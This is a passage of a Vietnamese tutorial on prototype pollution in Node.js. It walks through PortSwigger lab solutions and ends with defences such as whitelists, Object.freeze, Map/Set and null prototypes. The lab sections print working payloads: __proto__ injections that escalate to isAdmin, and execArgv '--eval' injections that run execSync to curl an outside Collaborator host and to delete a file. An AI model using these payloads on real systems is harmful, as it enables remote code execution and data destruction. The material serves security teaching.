Bắt đầu với hàm **`read()`**, các gói tin được truyền vào để xử lý, trong đó biến **`endcoding`** được xác định qua lệnh gọi hàm **`getCharset()`** hoặc mặc định với giá trị **`UTF-8`**. Với hàm **`getCharset()`** cho phép xác định định dạng ký tự thông qua tham số **`charset`** trong header **Content-type**. Như vậy, nếu **`contentType.parse(req).parameters.charset`** bị thay đổi sẽ ảnh hưởng tới quá trình giải mã của dữ liệu.

Về phương thức kiểm tra, có thể sử dụng định dạng **`UTF-7`**. Chẳng hạn, mã hóa của **foo** trong định dạng **`UTF-7`** là **`+AGYAbwBv-`**. Gửi request với dữ liệu như sau:

```json!
{
    "username":"viblo",
    "role":"+AGYAbwBv-"
}

```

 

Lúc này, do hệ thống sử dụng định dạng giải mã **`UTF-8`** nên chuỗi **`+AGYAbwBv-`** không bị thay đổi. Thực hiện lây nhiễm thuộc tính **`content-type`**:

```json!
{
    "username":"viblo",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}

```

 

Trong trường hợp ứng dụng tồn tại lỗ hổng Prototype Pollution, kết quả response sẽ giải mã theo định dạng **`UTF-7`** chuỗi **`+AGYAbwBv-`** và trả về chuỗi **`foo`**

### **6. Lab: Detecting server-side prototype pollution without polluted property reflection**
![image](https://hackmd.io/_uploads/H16tGKivR.png)

>Tiếp tục là chức năng update thông tin như lab trước:
>![image](https://hackmd.io/_uploads/Hy9T8FiPA.png)

>Thử poison prototype bằng payload của lab trước:
>![image](https://hackmd.io/_uploads/BkiJdtiP0.png)

>Nhưng trong respone không reflect lại thuộc tính ta vừa inject:
>![image](https://hackmd.io/_uploads/rkFKuFiDR.png)

>Thử phá vỡ cấu trúc cú pháp JSON, ta nhận được thông báo lỗi:
>![image](https://hackmd.io/_uploads/SkK0uYjvR.png)

>Và thông báo lỗi này đã reflect payload ta gửi từ request trước!! Mặc dù respone trả về lỗi 500 nhưng object lại là lỗi `"statusCode":400 Bad Request` . Ta có thể sử dụng phương pháp ghi đè `status` ở đây. Như ở phần lí thuyết, lab này sử dụng Express với đoạn code xử lí `status` kiểm tra nếu **`status`** mang giá trị nằm ngoài đoạn \[400;599\] sẽ thay đổi về giá trị mặc định là 500, bởi vậy nên lựa chọn giá trị ghi đè trong khoảng này:
>![image](https://hackmd.io/_uploads/rJihqFjPR.png)

>Lại làm lỗi cú pháp JSON và send lại request:
>![image](https://hackmd.io/_uploads/Hy309tow0.png)

>Respone trả về giá trị `530` mà ta controll được chứng tỏ ta đã poison thành công! Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ByoWjKiwR.png)

## 6\. Phát hiện lỗ hổng tự động với công cụ

Bên cạnh việc kiểm tra sự tồn tại của lỗ hổng Prototype Pollution server-side với các phương pháp đã nêu trên, chúng ta còn có thể sử dụng một số công cụ tự động hóa các quy trình nhằm tiết kiệm thời gian và công sức, đặc biệt trong bối cảnh kiểm thử ứng dụng có khối lượng công việc lớn.

Một trong những công cụ mang lại hiệu quả tốt với dạng lỗ hổng này là extension **Server-Side Prototype Pollution Scanner** của BurpSuite.

![image.png](https://images.viblo.asia/d75a8d80-9080-4994-9942-94b417aa1a51.png)

Chúng ta có thể kiểm tra từng request riêng biệt hoặc một nhóm các requests được bắt qua BurpSuite. Ví dụ kiểm tra tính năng update tại endpoint **`/my-account/change-address`**. Tại phần request > Click chọn chuột phải > Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution

![image.png](https://images.viblo.asia/a152e0d1-2a37-4c8c-b6d4-565641125a3c.png)

Tại đây cho phép lựa chọn nhiều kỹ thuật rà quét khác nhau, hầu như bao gồm đầy đủ tất cả các kỹ thuật đã được nhắc tới trong các phần trên. Bạn đọc cũng có thể chọn **Full scan** để kiểm tra tổng quát toàn bộ kỹ thuật detection. Kết quả phỏng đoán hiển thị tại **Issue activity**:

![image.png](https://images.viblo.asia/ca712135-ba3d-4969-ba2e-74f533cef87e.png)

### **7. Bypassing flawed input filters for server-side prototype pollution**
![image](https://hackmd.io/_uploads/rJ9XnasD0.png)

>Tiếp tục là 1 lab có chức năng cập nhập thông tin, ta sẽ sử dụng scan tại endpoint `change-address`:
>![image](https://hackmd.io/_uploads/Sy0c2TjvR.png)

>Biết được lab này tồn tại lỗ hổng prototype pollution phía server, ta sẽ thêm 1 thuộc tính custom và quan sát respone:
>![image](https://hackmd.io/_uploads/rk7Upaiv0.png)

>Thấy rằng thuộc tính `[json spaces]` chưa có giá trị, ta sẽ test thuộc tính này bằng cách set giá trị cho nó:
>![image](https://hackmd.io/_uploads/S167A6iw0.png)

>Nhưng có vẻ không khả thi, có khả năng server đã filter từ khóa `__proto__`, còn 1 cách khác để thay đổi thuộc tính là thông qua constructor dùng để thay thế `__proto__`. Thật vậy, khi payload sử dụng constructor, ta dễ dàng thấy thuộc tính  `[json spaces]` đã được set bằng giá trị mà ta controll:
>![image](https://hackmd.io/_uploads/S1kykCjPA.png)

>Lúc này, ta có thể thay đổi thuộc tính `isAdmin:true`:
>![image](https://hackmd.io/_uploads/BJg4JRiwR.png)

>Tải lại trang, ta thành công truy cập trang quản trị Admin Panel:
>![image](https://hackmd.io/_uploads/HyRHyCsPA.png)

>Xóa `carlos` và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/r1Gvk0sPA.png)

## 7\. Từ lỗ hổng Prototype Pollution dẫn đến Remote Code Execution (RCE)

Khi một ứng dụng web cho phép sử dụng nguồn dữ liệu không tin cậy để cập nhật các đối tượng JavaScript, kẻ tấn công có thể chèn các giá trị độc hại trong các dữ liệu này nhằm tấn công lỗ hổng Prototype Pollution. Đối với dạng lỗ hổng ảnh hưởng trực tiếp tới các thuộc tính trong hệ thống và chương trình vĩnh viễn, ở một số trường hợp cụ thể có thể dẫn đến các hậu quả nghiêm trọng, bao gồm Remote Code Execution (RCE) - Thực thi mã tấn công từ xa. Trong phần này, chúng ta sẽ cùng tìm hiểu một số case study cụ thể trong ngôn ngữ **NodeJS**.

Một số phương thức có nguy cơ bị khai thác có thể kể đến như **`child_process.fork()`**, **`child_process.spawn()`** và **`child_process.execSync()`**. Với **`child_process.fork()`**, theo tài liệu từ **[Nodejs](https://nodejs.org/api/child_process.html)**:

> child_process.fork(): spawns a new Node.js process and invokes a specified module with an IPC communication channel established that allows sending messages between parent and child.

Hiểu một cách đơn giản, phương thức **`child_process.fork()`** cho phép tạo một tiến trình con độc lập để xử lý các công việc. Tiếp tục để ý cấu trúc cú pháp của phương thức này:

**`child_process.fork(modulePath[, args][, options])`**

Đặc biệt với tùy chọn **`options`** chứa tham số **`execArgv`**, theo [https://github.com/nodejs/node/blob/main/doc/api/child\_process.md#child\_processforkmodulepath-args-options:](https://github.com/nodejs/node/blob/main/doc/api/child_process.md#child_processforkmodulepath-args-options:)

> execArgv {string\[\]} List of string arguments passed to the executable. Default: process.execArgv

**`execArgv`** là một danh sách các arguments (đối số) được truyền vào phương thức để thực thi, và có giá trị mặc định **`process.execArgv`**.

Do đó, trong trường ứng dụng bị ảnh hưởng bởi lỗ hổng Prototype Pollution, chúng ta có thể thay đổi giá trị thuộc tính **`execArgv`** để nâng cấp lỗ hổng dẫn đến việc RCE thông qua phương thức này. Chẳng hạn, bằng cách sử dụng argument **`--eval`** để đưa các dòng lệnh vào tiến trình con thực thi. Để thực hiện các lệnh, chúng ta sẽ sử dụng phương thức **`execSync()`** trong module **`child_process`**.

```json!
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('lệnh thực thi')"
    ]
}

```

 

Cụ thể, chúng ta xem xét chương trình ví dụ sau:

```javascript!
const { execSync, fork } = require('child_process');

function isObject(obj) {
    console.log(typeof obj);
    return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(target) {
    return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');

```

 

Với hàm **`merge()`** quen thuộc cho thấy chương trình tồn tại lỗ hổng Prototype Pollution. Ngoài ra, chương trình sử dụng hàm **`fork()`** khởi tạo một chương trình con, gọi file **`a_file.js`** và thể thực hiện các tác vụ được đề cập trong file này.

```javascript
var proc = fork('a_file.js');

```

 

Đây cũng là điểm kích hoạt tấn công RCE dựa trên kỹ thuật lợi dụng phương thức **`child_process.fork()`**, vì trước đó thuộc tính **`execArgv`** trong argument của phương thức có thể đã bị kẻ tấn công thay đổi dựa vào lỗ hổng Prototype Pollution.

### **8. Lab: Remote code execution via server-side prototype pollution**
![image](https://hackmd.io/_uploads/Hkld7CsvA.png)

>Đăng nhập vào `wiener`, ta được cấp quyền vào trang admin:
>![image](https://hackmd.io/_uploads/HygGE0jvC.png)

>Xem lại request tới endpoint `/admin/jobs`:
>![image](https://hackmd.io/_uploads/BJLNEAswA.png)

>Thử inject 1 thuộc tính `json spaces` bằng `__proto__`:
>![image](https://hackmd.io/_uploads/rkH4rCjw0.png)

>Trang admin tồn tại 1 nút để admin ấn vào thì dọn dẹp file và DB:
>![image](https://hackmd.io/_uploads/B1jLSCoD0.png)

>Đây là 1 chức năng kinh điển cho việc tạo ra các tiến trình con, như đã nói ở lí thuyết, nó có khả năng bị lợi dụng để RCE. Ta sẽ đi thăm dò nghi ngờ này bằng cách dùng Collab, payload:
```json 
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
>![image](https://hackmd.io/_uploads/SkhlwCovR.png)

>Quay lại và sử dụng chức năng ta thấy thông báo hiển thị Failed:
>![image](https://hackmd.io/_uploads/ryVGPAov0.png)

>Và ở phía Collab đã có những request gửi tới, chứng tỏ ta có thể thực hiện RCE web này:
>![image](https://hackmd.io/_uploads/HJtEvRoDR.png)

>Thay đổi payload để xóa file mà đề bài yêu cầu:
```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

>Send request:
>![image](https://hackmd.io/_uploads/Sy29v0iPR.png)

>Sử dụng lại chức năng clear data và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/r1_nv0iwC.png)

### **9. Lab: Exfiltrating sensitive data via server-side prototype pollution**
>![image](https://hackmd.io/_uploads/BkGAKRswA.png)

>Solved bài lab:
![image](https://hackmd.io/_uploads/SJE6tRivR.png)

### **10. Lab: Client-side prototype pollution via browser APIs**
>![image](https://hackmd.io/_uploads/Skr39RivC.png)

>Sử dụng công cụ DOM Invader để scan và phát hiện 1 `source` có thể khai thác:
>![image](https://hackmd.io/_uploads/HyL7j0jPC.png)

>Chọn **Scan for gadgets**:
>![image](https://hackmd.io/_uploads/S1YHiRoPR.png)

>Chọn **Exploit** để tool tự gen ra payload:
>![image](https://hackmd.io/_uploads/H1IPo0ovC.png)

>Thấy rằng trigger hàm alert thành công! Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/S1yKiAiPC.png)


V. Một số biện pháp ngăn chặn lỗ hổng Prototype Pollution
---------------------------------------------------------

### 1\. Kiểm tra các giá trị property keys

Dễ dàng nhận thấy hầu hết tất cả các kỹ thuật khai thác lỗ hổng đều phải sử dụng đến property key **`__proto__`**, như vậy một cách đơn giản nhất để ngăn chặn tấn công chính là phát hiện và loại bỏ chuỗi từ khóa này. Chẳng hạn, với các ứng dụng sử dụng **Nodejs**, các lập trình viên có thể sử dụng các flags command-line như **`--disable-proto=delete`** hoặc **`--disable-proto=throw`** để xóa, loại bỏ hoàn toàn **`__proto__`**.

Phương thức phòng ngừa này phần nào giống với tính chất sử dụng blacklist. Kẻ tấn công hoàn toàn có thể sử dụng một "con đường" khác, chẳng hạn như **`constructor`** để bypass cơ chế này, xem thêm trong bài lab [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

### 2\. Giới hạn property keys cho phép trong whitelist

Chúng ta nên "làm chặt" hơn bằng cách chỉ cho phép giá trị property key giới hạn trong một danh sách cụ thể (whitelist). Ví dụ hàm **`sanitizeObject()`** như sau:

```javascript!
const whitelist = ['allowedProperty1', 'allowedProperty2']; // Danh sách các property keys cho phép

function sanitizeObject(obj) {
  const sanitizedObj = {};

  for (const key in obj) {
    if (obj.hasOwnProperty(key) && whitelist.includes(key)) {
      sanitizedObj[key] = obj[key];
    }
  }

  return sanitizedObj;
}

```

 

Trước khi sử dụng giá trị dữ liệu đầu vào từ người dùng, giai đoạn xử lý dữ liệu sẽ sử dụng hàm **`sanitizeObject()`** để lọc đối tượng và chỉ giữ lại các property key trong whitelist.

### 3\. "Đóng băng" nguyên mẫu (Prototype Freezing)

Một ý tưởng khác nhằm ngăn chặn tấn công là không cho phép người dùng thay đổi các giá trị nguyên mẫu.

Phương thức phù hợp nhất với ý tưởng này là **`Object.freeze()`**. Sau khi khai báo đối tượng, có thể gọi phương thức **`Object.freeze()`** nhằm "đóng băng" đối tượng, khiến thuộc tính và giá trị của nó không thể bị thay đổi nữa, cũng không thể thêm mới thuộc tính nào.

```javascript!
const obj = {
  prop: 42
};

Object.freeze(obj);

obj.prop = 33;
// Throws an error in strict mode

console.log(obj.prop);
// Expected output: 42

```

 

Tuy nhiên, một nhược điểm rõ ràng của biện pháp này là các đối tượng trở nên "kém linh hoạt" do hầu như có thể coi là "hằng", không còn có thể thay đổi giá trị hay cập nhật thuộc tính mới. Thay vào đó, có thể sử dụng phương thức **`Object.seal()`**: vẫn cho phép thay đổi giá trị thuộc tính hiện tại nhưng không thể thêm mới thuộc tính hoặc xóa đối tượng:

```javascript!
const object1 = {
  property1: 42
};

Object.seal(object1);
object1.property1 = 33; // Change the value of property
console.log(object1.property1);
// Expected output: 33

delete object1.property1; // Cannot delete when sealed
console.log(object1.property1);
// Expected output: 33

```

 

### 4\. Sử dụng đối tượng Set / Map

Nguyên nhân chủ yếu của lỗ hổng Prototype Pollution là việc các đối tượng kế thừa giá trị các thuộc tính nguyên hiểm từ nguyên mẫu. Bởi vậy, khi xây dựng ứng dụng, có thể sử dụng các loại đối tượng Set hoặc Map để thay thế cho đối tượng thông thường. Cả hai đối tượng này không kế thừa các giá trị thuộc tính từ **`Object.prototype`** mà sử dụng một cơ chế an toàn khác nhằm tìm kiếm giá trị thuộc tính.

Đối tượng **Map** là một cấu trúc dữ liệu trong JavaScript cho phép lưu trữ dưới dạng các cặp **`key:value`**. Đặc biệt, Map không chia sẻ bất kỳ phương thức nào với **`Object.prototype`**, dẫn đến các thuộc tính prototype pollution không thể tác động lên Map. Ví dụ:

```javascript!
// Tạo một đối tượng Map mới
const myMap = new Map();

// Thêm cặp key-value vào Map
myMap.set("key", "value");

// Truy cập giá trị dựa trên key
console.log(myMap.get("key")); // Output: "value"

// Kiểm tra thuộc tính prototype có bị ảnh hưởng hay không
console.log(myMap.hasOwnProperty("toString")); // Output: false

```

 

![image.png](https://images.viblo.asia/7b3ac278-b4c4-494c-ac05-b9fb9ee4813d.png)

Đối tượng **Set** là một cấu trúc dữ liệu trong JavaScript cho phép lưu trữ các giá trị duy nhất (không có key). Tương tự như Map, Set không chia sẻ phương thức với **Object.prototype**, do đó, các thuộc tính prototype pollution không thể tác động lên Set. Ví dụ:

```javascript!
// Tạo một đối tượng Set mới
const mySet = new Set();

// Thêm giá trị vào Set
mySet.add("value1");
mySet.add("value2");

// Kiểm tra giá trị có tồn tại trong Set hay không
console.log(mySet.has("value1")); // Output: true

// Kiểm tra thuộc tính prototype có bị ảnh hưởng hay không
console.log(mySet.hasOwnProperty("toString")); // Output: false

```

 

![image.png](https://images.viblo.asia/f1529d9e-c2a0-45ca-b412-6d7c7c7a5941.png)

### 5\. Ngăn chặn kế thừa thuộc tính bằng Null prototype

Tất nhiên, không phải trong trường hợp nào các đối tượng kiểu Set hoặc Map cũng có thể đáp ứng được nhu cầu của ứng dụng. Nhiều trường hợp chúng ta bắt buộc phải khởi tạo và sử dụng các đối tượng thông thường trong chương trình. Đồng nghĩa với việc tính kế thừa prototype là bắt buộc (Tính chất của ngôn ngữ không thể thay đổi được).

Lúc này, chúng ta có thể ngăn chặn bằng cách tác động vào đối tượng sẽ được thực hiện kế thừa: Không cho phép kế thừa thuộc tính từ **Object** prototype - sử dụng **Null** prototype.

```javascript!
let myObject = Object.create(null);
Object.getPrototypeOf(myObject);    // null

```

 

Lúc này, đối tượng **`myObject`** sẽ không kế thừa bất kỳ thuộc tính từ **Object** prototype. Dễ dàng kiểm tra với đoạn code:

```javascript!
// Thêm thuộc tính viblo vào Object
Object.prototype.viblo = 1;

// Đối tượng thông thường vẫn kế thừa thuộc tính từ nguyên mẫu Object
let a = {};
console.log(a.viblo);

// Đối tượng Null prototype không kế thừa
let myObject = Object.create(Null);
console.log(myObject.viblo); // Output: undefined

```

 

![image.png](https://images.viblo.asia/170af20b-3a18-413b-b05a-30fd3073d680.png)
